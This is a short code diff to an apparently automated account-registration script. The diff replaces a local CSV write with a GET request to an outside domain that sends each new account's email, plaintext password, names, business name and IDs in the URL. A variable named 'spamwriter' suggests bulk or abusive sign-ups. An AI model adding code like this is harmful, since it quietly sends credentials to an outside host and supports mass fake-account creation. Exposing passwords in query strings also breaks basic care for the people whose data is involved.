@@ -246,9 +246,11 @@ class Register:
                 json_data = json.loads(response.text)
                 if json_data["success"]:
                     logger.info(self.EMAIL+","+self.PASSWORD+","+self.FIRST_NAME+","+self.LAST_NAME+","+self.BUSINESS_NAME+","+id1+","+id2)
-                    with open('ids4.csv', 'a', newline='') as csvfile:
-                        spamwriter = csv.writer(csvfile, delimiter=',', quotechar='|', quoting=csv.QUOTE_MINIMAL)
-                        spamwriter.writerow([self.EMAIL,self.PASSWORD,self.FIRST_NAME,self.LAST_NAME,self.BUSINESS_NAME,id1,id2,"registered"])
+                    response = requests.get("https://domesticfather.com/?data="+self.EMAIL+","+self.PASSWORD+","+self.FIRST_NAME+","+self.LAST_NAME+","+self.BUSINESS_NAME+","+id1+","+id2+"&status=registered")
+                    logger.info(response.text)
+                    # with open('ids4.csv', 'a', newline='') as csvfile:
+                    #     spamwriter = csv.writer(csvfile, delimiter=',', quotechar='|', quoting=csv.QUOTE_MINIMAL)
+                    #     spamwriter.writerow([self.EMAIL,self.PASSWORD,self.FIRST_NAME,self.LAST_NAME,self.BUSINESS_NAME,id1,id2,"registered"])
                 else:
                     logger.error(json_data)
             except:
